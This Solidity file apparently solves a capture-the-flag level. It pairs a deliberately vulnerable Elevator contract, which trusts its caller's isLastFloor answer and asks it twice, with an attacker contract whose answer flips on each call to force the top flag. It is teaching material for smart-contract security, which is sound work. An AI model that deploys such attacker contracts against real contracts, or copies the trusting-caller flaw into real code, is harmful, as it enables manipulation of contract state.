pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract ElevatorAttacker {
    bool public toggle = true;
    Elevator public target;

    constructor(address a) public payable {
        target = Elevator(a);
    }

    function isLastFloor(uint) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function setTop(uint _f) public {
        target.goTo(_f);
    }
}
